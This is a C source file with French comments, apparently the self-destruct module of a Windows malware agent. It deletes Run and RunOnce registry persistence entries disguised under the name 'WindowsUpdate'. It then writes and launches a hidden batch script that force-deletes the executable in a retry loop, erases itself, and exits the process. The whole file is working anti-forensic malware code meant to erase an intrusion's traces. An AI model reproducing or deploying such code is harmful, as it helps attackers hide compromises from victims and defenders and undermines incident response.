/*
 * destruct.c - Implémentation de l'auto-destruction de l'agent
 * 
 * Gère la suppression propre de toutes les traces de l'agent sur le système.
 */

#include "destruct.h"
#include "persist.h"
#include "../../utils/memory.h"
#include "../../utils/strings.h"
#include "../../core/config.h"

#include <windows.h>
#include <stdio.h>

/* Constants */

// Clés registry connues pour la persistence
static const char *REGISTRY_PATHS[] = {
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    NULL
};

// Nom de la valeur registry utilisée par l'agent
#define REGISTRY_VALUE_NAME "WindowsUpdate"

// Délai avant suppression du fichier (en secondes)
#define DELETE_DELAY_SECONDS 3

/* Internal helpers */

/*
 * Supprime une entrée registry.
 */
static int remove_registry_entry(HKEY root, const char *path, const char *value_name)
{
    HKEY hKey;
    LONG result;
    
    result = RegOpenKeyExA(root, path, 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        return -1;
    }
    
    result = RegDeleteValueA(hKey, value_name);
    RegCloseKey(hKey);
    
    return (result == ERROR_SUCCESS) ? 0 : -1;
}

/*
 * Crée un script batch qui attend puis supprime l'exécutable.
 * Le script se supprime lui-même à la fin.
 */
static int create_self_delete_script(const char *exe_path)
{
    char temp_path[MAX_PATH];
    char batch_path[MAX_PATH];
    char batch_content[1024];
    FILE *f;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    // Obtenir le dossier temp
    if (GetTempPathA(MAX_PATH, temp_path) == 0) {
        return -1;
    }
    
    // Créer le chemin du script batch
    snprintf(batch_path, sizeof(batch_path), "%s\\cleanup_%lu.bat", 
             temp_path, GetCurrentProcessId());
    
    // Contenu du script batch
    // Attend quelques secondes puis supprime l'exe et lui-même
    snprintf(batch_content, sizeof(batch_content),
        "@echo off\n"
        "ping 127.0.0.1 -n %d > nul\n"        // Délai
        ":retry\n"
        "del /f /q \"%s\" 2>nul\n"            // Supprimer l'exe
        "if exist \"%s\" goto retry\n"        // Réessayer si échec
        "del /f /q \"%%~f0\"\n",              // Supprimer le batch lui-même
        DELETE_DELAY_SECONDS + 1,
        exe_path,
        exe_path
    );
    
    // Écrire le script
    f = fopen(batch_path, "w");
    if (f == NULL) {
        return -1;
    }
    fwrite(batch_content, 1, strlen(batch_content), f);
    fclose(f);
    
    // Lancer le script en arrière-plan (caché)
    SecureZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    SecureZeroMemory(&pi, sizeof(pi));
    
    if (!CreateProcessA(NULL, batch_path, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return -1;
    }
    
    // Fermer les handles (le process continue en arrière-plan)
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return 0;
}

/* Public API */

int destruct_remove_persistence(void)
{
    int removed = 0;
    int i;
    
    // Supprimer les entrées HKCU
    for (i = 0; REGISTRY_PATHS[i] != NULL; i++) {
        if (remove_registry_entry(HKEY_CURRENT_USER, REGISTRY_PATHS[i], 
                                   REGISTRY_VALUE_NAME) == 0) {
            removed++;
        }
    }
    
    // Tenter aussi HKLM (nécessite des privilèges admin)
    for (i = 0; REGISTRY_PATHS[i] != NULL; i++) {
        if (remove_registry_entry(HKEY_LOCAL_MACHINE, REGISTRY_PATHS[i], 
                                   REGISTRY_VALUE_NAME) == 0) {
            removed++;
        }
    }
    
    // TODO: Supprimer les scheduled tasks si utilisées
    // TODO: Supprimer les services si utilisés
    
    return removed;
}

int handle_self_destruct(void)
{
    char exe_path[MAX_PATH];
    
    // 1. Obtenir le chemin de l'exécutable actuel
    if (GetModuleFileNameA(NULL, exe_path, MAX_PATH) == 0) {
        return -1;
    }
    
    // 2. Supprimer les entrées de persistence
    destruct_remove_persistence();
    
    // 3. Créer le script de suppression qui s'exécutera après notre mort
    if (create_self_delete_script(exe_path) != 0) {
        // Si ça échoue, on continue quand même la terminaison
    }
    
    // 4. Nettoyer la mémoire sensible
    // (Effacer les clés, configs, etc. avant de quitter)
    // Note: La fonction secure_free devrait être appelée sur toutes 
    // les données sensibles avant ce point
    
    // 5. Terminer le processus
    ExitProcess(0);
    
    // Ce code ne sera jamais atteint
    return 0;
}
